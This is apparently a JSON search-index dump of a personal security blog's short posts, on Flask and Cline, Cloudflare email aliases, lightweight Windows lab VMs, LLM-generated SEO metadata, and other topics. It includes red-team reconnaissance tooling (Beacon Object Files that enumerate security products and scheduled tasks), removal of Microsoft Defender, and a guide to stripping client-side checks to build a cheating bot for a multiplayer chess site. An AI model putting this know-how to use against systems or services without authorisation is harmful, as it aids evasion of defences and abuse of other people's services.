already!\nCreating a simple Flask blog With that done, we can ask it to create a small python application to showcase our blog post. Since we asked it to generate the content in markdown, we need to make sure that it properly converts it to HTML before displaying it:\nCline creating a simple flask blog app with SQLite database created previously This results in the following app.py file being created with a simple route which retrieves the blog posts and displays them:\nCline generated simple Flask blog with SQLite storage It also generates a simple template to render the blog post view:\nCline generated simple Flask blog index template And when we serve it, we get the following:\nSimple Flask Blog result in browser Not too bad considering this took us exactly 3 prompts to go from nothing to a Flask blog application with a populated SQLite database! There seems to be a small issue with the display and the newlines don’t appear to be converted properly but we can relay that information to the Agent and ask it to fix it for us, which it does without much trouble:\nCline fix markdown newline issue And our rendered blog is not too bad:\nFinal result for Simple Flask blog "},"title":"Building a Flask Blog in 3 prompts with AI Coding Tools: Using Cline \u0026 MCP Servers in VSCode"},"/minis/create-infinite-email-aliases-using-cloudflare-email-routing/":{"data":{"":"I did it… I finally passed the big 30…. 30000 unread emails!\nI would like to thank my pre-school teacher Jacky, Martha our cat lady neighbour who said I wouldn’t make it and Jacob, my imaginary friend with one eye. Many years of signing up to random garbage and being too lenient has led me to this. But today this changes…\nWhile I’ve created and use many different email addresses to try and limit the garbage, I’ve wanted to move to an easier to manage solution that has the following features:\nallows me to create unlimited aliases easily so I can filter spam messages or addresses that I no longer want to receive and have the ability to identify leaks if any were to happen (ie. garbage.com@mydomain.com is breached, hackers use the email to send spam/phishing to it which I can pinpoint easily to garbage.com). be relatively cheap allows me to create or use multiple domains so I can filter additionally based on trash levels. (ie. level 1 trash goes to domain1, level 2 trash goes to domain2 and super trash goes to thisdomainwillberotatedsoon) Notice I haven’t mentioned email privacy in the above. While I value privacy and believe long term I will incorporate it into the above solution, I’m currently looking for a solution that provides improved security and peace of mind. I also have plans to improve my self-hosted setup in the future and will include email aliasing or an equivalent solution. However, for the time being, I believe this might be the easiest and cheapest solution to setup and play around with.\nThe solution I’m talking about is Cloudflare email routing which allows you to forward emails sent to a domain you own to any email address of your choosing.\nThis feature is free meaning you only have to own a domain to be able to set this. Cloudflare provides an easy to use solution with just a few clicks.","opsec-privacy-and-notes-of-caution#OPSEC, Privacy and notes of caution":" Cloudflare is a one stop shop which centralises a lot of internet traffic. The email are routed through their servers which could technically log all of them for whatever reason… You should make your own decision whether to trust them with your emails. For important accounts, I would recommend using your email address directly instead of an alias, unless you need it as part of your OPSEC/Threat Model. While I check and I don’t think it’s possible to use the MX DNS records to identify if two Cloudflare domains are connected (ie. like for NS records on Cloudflare domains), there may be various attacks I am unaware off. Do your own research. If you plan on using an email client like Thunderbird, you’ll need to have access to SMTP ports which depending on the email provider might be a paid feature (eg. protonmail) or protected by account verification. This is done by providers to reduce spam and phishing emails being sent from their services. ","sending-emails#Sending emails":"Sending emails used to be possible, however Cloudflare discontinued their mailchannels partnership (I’m assuming it was abused a ton..) which means you can no longer send emails. They only allow you to send emails to address you own / have access to (second step phishing maybe? 🤔) and require you to verify you own the address (ie. email verification via email link).\nSee the following references for more details:\nhttps://developers.cloudflare.com/email-routing/email-workers/send-email-workers/ https://www.mailchannels.com/email-api/ https://github.com/Sh4yy/cloudflare-email https://github.com/Sh4yy/cloudflare-email/issues/16 https://github.com/Sh4yy/cloudflare-email/issues/19 ","setting-up-the-redirection#Setting up the redirection":" Important\nBefore you start looking into this, remember that the ability to send email via Cloudflare email aliasing no longer works. You’d have to find another solution if you need to send email addresses or use your email directly.\nWhat you’ll need:\nan email provider (eg. gmail, protonmail, microsoft, etc..) - Anything will be supported as it’s only used to receive email addresses. Choose whichever solution fits your needs. a Cloudflare hosted domain you own and on which you can setup MX records to point to Cloudflare mail servers 5 minutes of your time Start by selecting the Cloudflare domain you want to setup for email routing from your Cloudflare dashboard. You’ll then need to select Email \u003e Email Routing from the left navbar, which should bring you to a page similar to this:\nFrom here, you’ll need to verify your destination address and setup the MX records which should only be a few clicks from the dashboard. Just follow the instructions. Once done, you can setup your routing rules and you can set a catch-all email address from here:\nYou can also create custom addresses and redirect those to another destination if you wish. (or play around with Cloudflare workers for additional functionality):\nIf done correctly, you can start using your email address to register accounts from any spammy website. For example, I needed access to Alltrails some time ago so I created an account on Alltrails with the email address alltrails@domain2.com which I now receive all Alltrails spam emails to:\nLooking at the email source, we can see it routed via Cloudflare properly:\nNote\nEmail providers may consider these routed emails as spam emails (if you are using a spammy looking email address). eg. I own a domain which contains the name of a know email provider in it and that almost always ends up being considered spam. This might be a good thing if you want to signup with this domain to only spammy websites that you dont need to keep emails for (ie. autodeletes after 30 days) but might not be desirable for other websites."},"title":"Create Infinite Email aliases using Cloudflare Email Routing"},"/minis/creating-lightweight-windows-virtual-machines-for-your-personal-lab-environment/":{"data":{"":"Windows VMs are great… Until they hog half of your laptop’s resources, take up at least 40GB of storage and are basically unusable whenever an app requires the slightest amount of computing power.\nI had that issue for a very long time until I came across this unbelievable tweet of Windows 11 running on 184MB of RAM:\nhttps://x.com/NTDEV_/status/1876434066364383507 Any human successfully running Windows 11 on a 2009 iPod Touch amount of RAM is a legend in my books. I had to look into this in-human person who was going to be my spirit animal for the day…\nAs it turns out, this is not NTDEV’s first rodeo… This man eats RAM for breakfast! Looking through his previous tweets and reading his blog, I’ve realised he has released a number of tiny Windows ISOs for Windows 10 and Windows 11. These tiny ISOs are lightweight, stripped-down versions of their respective counterparts. I thought surely, they can’t be that much better than the official Windows 10 ISO.\nSo I tried them… Furiously deleted on a few more resources and boy was I blown away by the final resource consumption reduction!","comparing-an-unmodified-windows-vm-with-my-custom-lightweight-vm#Comparing an unmodified Windows VM with my custom Lightweight VM":"The following screenshots were made under the following conditions in an attempt to provide a fair comparaison:\nVMs were given the exact same resources Both were under zero load (ie. at rest, no user application running) when the screenshots were taken VM Screen Display settings were set to the same Display resolution Task Manager Performance Windows 10 Task Manager Performance Lightweight VM Windows 10 CPU at rest example 1 Windows 10 CPU at rest example 2 Lightweight VM CPU at rest Drive Space Windows 10 Drive Space Tiny10 While comparing the two VMs, the following things were noted:\nThe original Windows 10 VM was using around 1.5 times the Memory (RAM) of the Lightweight VM. The CPU on the Windows 10 VM was a lot more sporadic, with numerous spikes even when no user application is running, while the Lightweight VM hovered around 1 to 2 % CPU utilisation. The Windows 10 VM was around 27.3 GBs while the Lightweight VM required a maximum of 10.3 GBs to install The initial ISO’s used had a 2.2GB size discrepancy, with the smallest being the tiny10 ISO: 3.6G 'tiny10 x64 23h2.iso' 5.8G Win10_22H2_EnglishInternational_x64v1.iso Further improvements are potentially possible, however you should be cautious as the more things you remove, the more likely you are to have issues, missing features and render the VM unusable.","conclusion#Conclusion":"Overall, there is a significant amount of bloat on full Windows 10 ISOs which can be improved provided you don’t need the features that are being removed. This results in tiny ISOs with amazing benefits:\nLower RAM and CPU usage Smaller disk footprint Faster boot and responsiveness These can be great for lower end devices, when you need to run a lot of VMs in parallel for examples for an Active Directory Lab Environment, to save battery/energy on a device, and more…","creating-a-lightweight-windows-10-vm#Creating a Lightweight Windows 10 VM":"First, I download the tiny10 ISO from archive.org: https://archive.org/download/tiny-10-23-h2/tiny10%20x64%2023h2.iso. You can speed up this process using aria2c to download the file with multiple server connections.\nI then installed it on my Virtualisation software of choice, namely QEMU.\nI booted it and decided to remove Microsoft Defender because I didn’t need it for the VM’s use case which reduced the RAM consumption a lot. I personally used the following tool which worked at the time. As these are patched by Microsoft every so often, YMMV.\nI also tried the following “Debloater”, not sure if it actually did anything… Seems like most of it was already taken care of by NTDEV’s Tiny ISO.\nFrom looking at task manager and assessing the resource consumption of different processes, this felt like a good first pass where I eliminated the most consuming resources and attempting to go any further would take unreasonable amount of time for little benefit (Pareto principle).\nSo that was pretty much it for optimisation…","further-research#Further Research":"There are definitely more things you can delete but you risk running into issues. Resource Monitor might be a great place to start:\nOther tools to consider for identifying processes hogging resources:\nhttps://systeminformer.com/ https://learn.microsoft.com/en-us/sysinternals/downloads/procmon If you’re interested in making your own tiny ISO’s, you should look at ntdev’s GitHub repo tiny11builder which has all the tools for building a tiny Windows 11 ISO. There are also a number of GitHub forks to create tiny Windows 10 ISOs too… Do your own research.","references#References":" https://x.com/NTDEV_ https://ntdev.blog/2024/01/08/the-complete-tiny10-and-tiny11-list/ https://archive.org/details/@ntdev https://answers.microsoft.com/en-us/windows/forum/all/how-to-reduce-ram-consumption-in-windows-10/cb42a95f-8fe8-47dc-9721-d31e5379b826 https://ntdev.blog/2023/12/10/how-to-build-your-own-tiny11-the-definitive-guide-on-how-to-create-the-perfect-lightweight-windows-image/ https://techcommunity.microsoft.com/discussions/windows11/how-to-open-resource-monitor-using-task-manager-on-windows-11/3333480 "},"title":"Creating Lightweight Windows Virtual Machines for your Personal Lab Environment"},"/minis/improving-functionality-of-open-source-bofs/":{"data":{"":"","#":"OperatorsKit https://github.com/fyxme/OperatorsKit Original source: https://github.com/REDMED-X/OperatorsKit/\nEnumDrives BOF NETWORK drives will now find and print the mapped network share add Makefile for compiling on linux via mingw Before: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] After: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] \\\\web01.fyxme.local\\webserver\\www EnumSecProducts BOF expanded software list from 130 to 150 security tools added improved output with pid and procname for identified security tools add Makefile for compiling on linux via mingw The BOF has been modified to include the process id (pid) and the filename of the security process it flagged.\nBefore: Description Category ============================================================== Windows Defender AV Microsoft Security Essentials AV After: Category Pid Filename Description ============================================================== AV 1688 msmpeng.exe Windows Defender AV 3240 nissrv.exe Microsoft Security Essentials EnumTaskScheduler BOF Find and print command arguments for each scheduled task that runs an executable add Makefile for compiling on linux via mingw Before: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Trigger type: Daily ---------------------------------------------------- After: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Command Arguments: /c \"shutdown /r /t 0\" - Trigger type: Daily ---------------------------------------------------- "},"title":"Improving functionality of Open Source BOFs"},"/minis/leveraging-ai-to-automate-seo-metadata-generation-for-web-content/":{"data":{"":"I’ve been playing around with AI for the past few weeks, trying to test its limit, bypass security features, check its use cases and see how it can be leverage for every day work (eg. programming, information gathering, research and more). One thing I’ve realised is how hard it is to keep up with the insane amount of things that are being created with it, new research dropping constantly and the tools evolving at a rapid pace.\nI’ve also wanted to learn more about SEO for a while and use this blog as a playground. This seemed like the perfect use case to try and integrate AI into the deployment workflow for this website and generate SEO components such as page descriptions, post titles and more.","conclusion#Conclusion":"Overall, a lot of potential and in my opinion some good use cases for AI. Still quite a bit of work to do to optimise everything, improve error handling and make it generally more robust but great outcome as a Proof-of-Concept.\nHere’s the metadata it generated for this post:\n~/websites/fyx.me \u003e python3 seo-generator/fieldsgen.py content/minis/AI\\ SEO\\ generation.md [!] Model : google/gemini-2.5-pro-exp-03-25:free Title : Leveraging AI to Automate SEO Metadata Generation for Web Content Desc. : Explore how AI, specifically LLMs accessed via platforms like openrouter.ai and frameworks like Agno, can automate SEO metadata generation for Hugo websites. Learn about the process, tools, challenges, and potential of integrating AI into your deployment workflow. Tags : ['AI', 'Artificial Intelligence', 'SEO', 'Search Engine Optimization', 'Metadata Generation', 'LLM', 'Large Language Models', 'openrouter.ai', 'Agno', 'Python', 'Automation', 'Hugo', 'Static Site Generator', 'API Integration', 'Workflow Automation', 'Structured Output', 'SEO Tools'] Lastly, I think AI in general is a great tool to help in speeding up workflows but as always it works even better when you validate/approve what it does. In this case review the metadata it generates and tweak it slightly.","outcome#Outcome":"As an example, here is the SEO description and tags generated for the file synchronisation cheatsheet in the bazaar (note the weird CLI parameter used as a tag “-avPh”):\nFile Synchronisation markdown file with generated metadata viewed in Obsidian Here’s what it looks like on the front-end with the SEO metadata set in the HTML head element:\nFile Synchronisation rendered after Hugo generates the HTML page Honestly, pleasantly surprised considering this is a page with limited content.","unified-interfaces-for-large-language-models-llm-api-providers#Unified interfaces for Large Language Models (LLM API providers)":"I currently don’t have the hardware resources to run large language models locally and since I wanted to learn more about how each model differs from one another, I’ve settled on using openrouter.ai. They provide an API interface to different model providers and allow you to use 383 different models (at the time of writing), including a number of free models (great for testing).\nopenrouter.ai Available Models To use the model via openrouter, you need to an LLM Frontend such as SillyTavern, Open WebUI or LibreChat. There’s so many out there but these seem to be the most popular (other than the built-in Web UIs). They all get constantly updated to support the newest bells and whistles like MCP servers and tools, chat history and more.\nHowever, if you’re going to build stuff with AI, you’ll need to find a library to integrate models into your code (or build your own). Again, there’s so many of them out there and the landscape is changing constantly but a few currently seem to stand out. For this small project, I wanted to try out one of the frameworks that seemed very promising due to the integrations it has, great documentation and strong coding practices, namely I wanted to use Agno. The examples they had really sold me on the framework plus the ability to request structured output which made this extremely easy.\nUsing the framework, it took little time to write a program that takes in a file, reads it in, sends the content to an Agent and request it to generate SEO metadata.","using-an-ai-agent-to-generate-seo-optimised-metadata#Using an AI agent to generate SEO optimised metadata":"I use Hugo to convert my markdown content into a static website. The pages can contain metadata stored at the top of the page using the front matter format. This allows us to modify the output title, description, tags/keywords and more. As such, this is what we’ll update with this tool before generating out site.\nThis was the initial script I used, with really dump prompts, no optimisations, nothing special honestly (I’ve even left the comments in to show you how little effort this required):\nPython script using Agno to generate SEO metadata This worked surprising well and with some small tweaks, you can see the results:\nfieldsgen.py example output Depending on the model you’re using the inference speed takes more or less time but for such as simple task (as long as you don’t use reasoning models), this is fairly quick.\nIt’s also extremely easy to switch out the models as you can see in the commented out code above. Changing the models produces different outputs and allows you to identify the best model for this sort of task:\nfieldsgen.py example output with different Models Sometimes, the models may not cooperate and provide output in the wrong format which causes errors:\nfieldsgen.py example error Thankfully, by searching the Agno documentation (using their builtin AI search because we’re in the theme of AI), we find an easy solution for error handling to retry on failure:\nAgno Documentation answer with AI Agno Documentation answer with AI response It’s not super robust but for our use-case is good enough:\nagent = Agent( model=OpenRouter(id=\"openrouter/optimus-alpha\"), description=\"You are an SEO specialist who generates SEO optimised metadata\", response_model=SEOPage, exponential_backoff=True, retries=3, ) It’s still not perfect, sometimes returns weird keywords, and does sometime return the same keyword/tags more than once but with more tweaking, additional code checks and finding the optimal model for this task, it will help generate SEO metadata for the site’s pages (especially pages that I’m not too concerned about like the bazaar pages)."},"title":"Leveraging AI to Automate SEO Metadata Generation for Web Content"},"/minis/reverse-engineering-onemillionchessboards.com-frontend-with-chrome-devtools-to-build-a-bot/":{"data":{"":"A twitter user by the name of nolen has once again released another banger website, onemillionchessboards.com. Its not to hard to understand what this website is about….\nTLDR: its 1 million chessboards… with some caveat rules that apply to make it more fun.\nNolen twitter post onemillionchessboards.com I played around with it for a bit and enjoyed it but I was more interested about how things were built so I decided to look under the hood.\nThe creator shared on twitter a little of how is app works on the backend:\nnolen twitter 'runs on a single server' nolen twitter 'zstd-compressed protobufs' nolen twitter onemillionchessboards.com backend details On the front-end, I wanted to see if the user checks matched the back-end checks and while I didn’t verify everything, it was pretty robust.\nSo I did the next best thing and decided I would make a bot instead. The bot would make moves so fast it can survive easily and eat as many pieces as possible in the process.","conclusion#Conclusion":"DevTools are great to create PoCs, reverse engineer applications and can help when validating security checks, especially when dealing with web-sockets and the likes. They give a lot of power to the user and can drastically increase reverse engineering speed as they don’t require you to recreate the whole functionality to test things.\nOverall, a great tool to have in your arsenal.","reversing-applications-using-local-javascript-file-overrides#Reversing applications using local JavaScript file overrides":"The frontend is using React which we can see easily from the React Developer Tools Extension lighting up:\nonemillionchessboards.com built in react I actually don’t know how to use the react developer tools plugin so instead I decided to look at the raw JavaScript using the built-in Chromium DevTools and modify the functionality from there by overwriting the JavaScript file myself with a local file:\nDevTools file override With this I now have the ability to modify front-end code, add functionality, remove client-side security checks and what not. This makes it very convenient especially with applications that deal with web sockets as having to recreate the full initialisation, security checks and compression might not be easy to see from a simple web-socket proxy (ie. Burpsuite).\nThere s also a few built-in functionalities that help with reversing the code.\nPretty Printing The code is minified but you have the ability to unminify it (pretty print) so that its easier to read and modify:\nDevTools pretty print Using JavaScript breakpoints You can also add breakpoints in your custom file as such:\nDevTools insert breakpoint They will trigger when the code reaches your breakpoint and you can use it to see the values of each variables, which could help reversing the application:\nDevTools trigger breakpoint Note\nIt’s not a foolproof method and may end up crashing the tab when you make changes. In this case, its usually easier to close the tab and reopen it:\nDevTools may cause tab crashes ","reversing-the-onemillionchessboards-application#Reversing the onemillionchessboards application":"With these functionalities in mind, we can now look at reversing the frontend application code. I usually like to start with functions that talk to the backend since they’re the ones that will have an impact on the application in the end. So I search for any backend requests via WebSockets, HTTP(S) requests or else.\nFor this application, I found the function that sends a msg via a websocket to the backend when a move is made, the $1a465e5e0e1a643e$var$protoSendMove function:\nonemillionchessboards.com protoSendMove function The arguments are not minified so its fairly easy to guess what each argument does:\nws is the websocket itself piece is the piece we want to move toX is the x location we want to move to toY is the y location we want to move to moveType and moveToken are the only two interesting ones here since its uncertain what they mean. By doing a bit more digging, we can find references to MoveType around the application and see that it’s basically an integer value that can denote a normal move, a castle move or en passant move:\nonemillionchessboards.com MoveType constant By checking where the $1a465e5e0e1a643e$var$protoSendMove function is called, we can see what moveToken is generated from the getIncrMoveToken function:\nonemillionchessboards.com protoSendMove function call Going one step further, we can see that it’s basically a token that gets sent with our request and gets incremented on every move made:\nonemillionchessboards.com getIncrMoveToken function So now we know how to make moves via code directly.\nFrom here, I looked around and found a getMoveableSquares function that returns which squares you are allowed to move to but also which squares will end up capturing a piece which is really convenient since we can use that to prioritise our moves later on:\nonemillionchessboards.com getMoveableSquares function When looking at the Map returned by the getMoveableSquares function we can see the captured pieces:\nonemillionchessboards.com getMoveableSquares returned value With all that in mind we can make a function that moves a piece we selected to a nearby moveable square, prioritising squares that end up capturing an opponent’s piece:\nonemillionchessboards.com custom move piece code Note\nThis function could obviously be improved a lot more to make a more intelligent bot (eg. retrieve the full map and optimise moves based on that). Nevertheless, this is only an example to showcase what can be done by simply using built-in DevTools.\nmakeMove is a custom function which reuses the code from the message create function we found earlier:\nonemillionchessboards.com custom makeMove function Now that we have this, we just need to wrap the code in an interval so that it triggers often (while making sure we don’t trigger too much to overwhelm the server or have our moves dropped).\nIn the end, I decided to modify the $a2d3bef833187ce9$export$474cd6ee072cf5a4 function which is called when you select a chess piece as it already has all the handlers I need to make the bot work. It also allows means I don’t have to create a button or anything and can simply select any piece to start the bot.\nI added a startConquest function here:\nonemillionchessboards.com startConquest call inside `$a2d3bef833187ce9$export$474cd6ee072cf5a4` function The function is basically an “interval” version of the function described previously:\nonemillionchessboards.com custom startConquest function gws is a global variable which holds the websocket object that I populate during initialisation. Tried to get it dynamically using $parcel$interopDefault but since its a react minified file, scopes are protected by exports and what not and I couldnt make it work so resorted to using a global variable (not ideal but its also only a PoC so not a huge problem).","the-bot-in-action#The bot in action":"In the end the result is pretty cool, I can just select any piece and they will start zooming around randomly, eating as many of the opposing pieces as possible.\n@itseieio I'm cheating harder than Hans Niemann over here... When VAC ban? https://t.co/3Nqmk6jCJw pic.twitter.com/0DuIxg5XRi\n— fyx (@_fyxme) May 4, 2025 "},"title":"Reverse Engineering onemillionchessboards.com Frontend with DevTools to Build a Bot"}}